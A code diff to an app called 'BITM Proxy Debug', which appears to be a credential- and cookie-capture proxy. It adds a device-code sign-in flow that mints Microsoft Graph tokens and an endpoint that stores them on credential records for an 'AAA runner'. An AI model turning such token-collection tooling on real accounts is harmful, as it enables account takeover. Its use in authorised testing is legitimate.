@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.34.0")
+app = FastAPI(title="BITM Proxy Debug", version="1.35.0")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -1745,6 +1745,28 @@ async def api_aaa_login(body: dict):
         site_id, user, password, tenant_id,
         service_principal=sp, persist=True,
     )
+
+
+@app.post("/api/aaa/store-token")
+async def api_aaa_store_token(body: dict):
+    """Persist a device-code-acquired Graph token onto a credential record so
+    the AAA runner can use it (its Token dropdown). Used by the AAA login
+    panel's device-code method, which mints the token via
+    /api/ado-devicecode/{start,poll} with a Graph scope — the interactive,
+    MFA-satisfying alternative to Connect-AzAccount. Body:
+    {site_id, access_token, tenant_id?}."""
+    from backend.shared import get_config_value as _gcv
+    if not _gcv("enable_token_testing", True):
+        return {"ok": False, "error": "Token testing disabled (enable_token_testing=false)."}
+    site_id = (body.get("site_id") or "").strip()
+    token = (body.get("access_token") or "").strip()
+    if not site_id or not token:
+        return {"ok": False, "error": "site_id and access_token required"}
+    from backend import aaa_runner as _aaa
+    ok = await _aaa.persist_captured_token(
+        site_id, token, body.get("source") or "device-code",
+        (body.get("tenant_id") or "").strip())
+    return {"ok": ok, "persisted": ok}
 
 
 @app.get("/api/headers")
@@ -7175,22 +7197,34 @@ function renderAaaTokenSnippet(d,siteId){
     </div>
     <pre style="background:#0a0a14;padding:8px;border-radius:4px;color:#cbd5e1;font-size:12px;white-space:pre-wrap;word-break:break-all;margin:0">${esc(cmdShown)}</pre>
     <div id="aaa-login-${siteId}" style="display:none;margin-top:8px;background:#0a0a14;padding:10px;border-radius:4px;border:1px solid #3f1d1d">
-      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
-        <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
-        <input id="aaa-login-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:8px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">Method</label>
+        <select id="aaa-login-method-${siteId}" class="cfg-input" style="font-size:13px;flex:1;min-width:260px" onchange="aaaLoginMethodChange('${siteId}')">
+          <option value="password" selected>Password — Connect-AzAccount (needs Az.Accounts)</option>
+          <option value="devicecode">Device code — Graph token, satisfies MFA</option>
+        </select>
       </div>
-      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
-        <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
-        <input id="aaa-login-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
+      <div id="aaa-login-pw-${siteId}">
+        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+          <label style="color:#94a3b8;font-size:13px;min-width:64px">User</label>
+          <input id="aaa-login-user-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(guessUser)}">
+        </div>
+        <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+          <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
+          <input id="aaa-login-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
+        </div>
+      </div>
+      <div id="aaa-login-dc-${siteId}" style="display:none;color:#78859b;font-size:11px;margin-bottom:6px">
+        Click <b>Start device code</b> — enter the code at microsoft.com/devicelogin, complete sign-in (with MFA), and the Graph token is stashed on this credential for the AAA runner. No Az.Accounts or password needed.
       </div>
       <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
         <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
-        <input id="aaa-login-tid-${siteId}" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" value="${esc(tid)}">
-        <label style="color:#94a3b8;font-size:13px;margin-left:6px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="aaa-login-sp-${siteId}" checked> -ServicePrincipal</label>
-        <button class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="aaaLoginRun('${siteId}')">▶ Run</button>
+        <input id="aaa-login-tid-${siteId}" class="cfg-input" style="flex:1;min-width:200px;font-size:13px" value="${esc(tid)}">
+        <label id="aaa-login-sp-wrap-${siteId}" style="color:#94a3b8;font-size:13px;margin-left:6px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="aaa-login-sp-${siteId}" checked> -ServicePrincipal</label>
+        <button id="aaa-login-go-${siteId}" class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="aaaLoginGo('${siteId}')">▶ Run</button>
       </div>
       <div style="color:#78859b;font-size:11px;margin-bottom:6px">
-        Spawns pwsh with Connect-AzAccount → Get-AzAccessToken. Token is appended to <code>tokens[]</code> on this credential record so the AAA runner can use it. Requires <code>Az.Accounts</code> module.
+        Token is appended to <code>tokens[]</code> on this credential record so the AAA runner can use it. Password uses Connect-AzAccount (needs <code>Az.Accounts</code>, fails on an MFA tenant); device code is interactive and works with MFA.
       </div>
       <div id="aaa-login-result-${siteId}" style="font-size:13px"></div>
     </div>
@@ -8104,6 +8138,62 @@ async function aaaLoginRun(siteId){
     // Token dropdown without a manual reload.
     send({cmd:'get_sites'});
   }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
+}
+function aaaLoginMethodChange(siteId){
+  const m=document.getElementById('aaa-login-method-'+siteId).value;
+  const show=(id,on)=>{const e=document.getElementById(id);if(e)e.style.display=on?'':'none'};
+  show('aaa-login-pw-'+siteId, m==='password');
+  show('aaa-login-dc-'+siteId, m==='devicecode');
+  show('aaa-login-sp-wrap-'+siteId, m==='password');
+  const btn=document.getElementById('aaa-login-go-'+siteId);
+  if(btn) btn.textContent=(m==='devicecode')?'▶ Start device code':'▶ Run';
+}
+function aaaLoginGo(siteId){
+  const m=document.getElementById('aaa-login-method-'+siteId)?.value||'password';
+  return (m==='devicecode') ? aaaLoginDeviceCode(siteId) : aaaLoginRun(siteId);
+}
+async function aaaLoginDeviceCode(siteId){
+  const out=document.getElementById('aaa-login-result-'+siteId);
+  const tid=(document.getElementById('aaa-login-tid-'+siteId)?.value||'').trim()||'organizations';
+  out.innerHTML='<div style="color:#94a3b8">requesting device code…</div>';
+  let start;
+  try{
+    const r=await apiFetch('/api/ado-devicecode/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,scope:'https://graph.microsoft.com/.default offline_access'})});
+    start=await r.json();
+  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>';return}
+  if(!start.ok){out.innerHTML='<div style="color:#f87171">✗ '+esc(start.error||'device code init failed')+'</div>';return}
+  const dc=start.device_code, cid=start.client_id;
+  const vuri=start.verification_uri||'https://microsoft.com/devicelogin';
+  out.innerHTML=`<div style="background:#0c1912;border:1px solid #1f3a29;border-radius:4px;padding:10px;margin-bottom:6px">
+    <div style="color:#e6edf3;font-size:13px;margin-bottom:6px">Complete sign-in (with MFA) to mint a Graph token:</div>
+    <div style="font-size:13px;margin-bottom:4px">1. Open <a href="${esc(vuri)}" target="_blank" style="color:#56c2ff">${esc(vuri)}</a></div>
+    <div style="font-size:13px">2. Enter code <code style="background:#020617;color:#4ade80;font-size:15px;padding:2px 8px;border-radius:4px;font-weight:700;letter-spacing:1px">${esc(start.user_code||'?')}</code>
+      <button class="btn" style="padding:1px 8px;font-size:11px;background:#1e3a5f" data-tok="${esc(start.user_code||'')}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button></div>
+    <div id="aaa-login-dcs-${siteId}" style="color:#94a3b8;font-size:12px;margin-top:8px">⏳ waiting for you to complete sign-in…</div>
+  </div>`;
+  const st=document.getElementById('aaa-login-dcs-'+siteId);
+  const deadline=Date.now()+Math.min(start.expires_in||900,900)*1000;
+  let poll=Math.max(start.interval||5,5)*1000;
+  const tick=async()=>{
+    if(Date.now()>deadline){st.innerHTML='<span style="color:#f87171">✗ device code expired — Start device code again</span>';return}
+    try{
+      const r=await apiFetch('/api/ado-devicecode/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,client_id:cid,device_code:dc})});
+      const d=await r.json();
+      if(d.ok&&d.access_token){
+        st.innerHTML='<span style="color:#4ade80">✓ signed in — stashing token…</span>';
+        const sr=await apiFetch('/api/aaa/store-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,access_token:d.access_token,tenant_id:tid,source:'device-code'})});
+        const sd=await sr.json();
+        st.innerHTML= sd.ok
+          ? '<span style="color:#4ade80">✓ Graph token stashed to credentials — pick it in the AAA runner Token dropdown.</span>'
+          : '<span style="color:#f87171">token obtained but persist failed: '+esc(sd.error||'?')+'</span>';
+        if(sd.ok) send({cmd:'get_sites'});
+        return;
+      }
+      if(d.pending){if(d.slow_down)poll+=5000;setTimeout(tick,poll);return}
+      st.innerHTML='<span style="color:#f87171">✗ '+esc(d.aadsts_code||d.error||'failed')+'</span>';
+    }catch(e){setTimeout(tick,poll);}
+  };
+  setTimeout(tick,poll);
 }
 function tokenToggle(siteId){
   const p=document.getElementById('tok-'+siteId);
